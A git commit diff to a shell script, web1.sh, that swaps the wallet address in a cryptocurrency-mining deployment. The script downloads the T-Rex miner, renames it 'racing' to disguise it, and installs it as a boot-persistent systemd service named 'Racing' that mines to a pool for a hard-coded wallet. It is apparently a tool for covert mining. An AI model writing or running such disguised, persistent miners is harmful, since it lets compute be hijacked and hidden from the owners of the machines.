45b18e25d0955a8e48cd1ba1b9d3235ae31fb1ae
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-06-15 00:19:08 +0000

    Update web1.sh

--- web1.sh
+++ web1.sh
@@ -11,7 +11,7 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xCE75f761dA07B5ef72725f938646BdbA8D6F01C3 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w web1 &
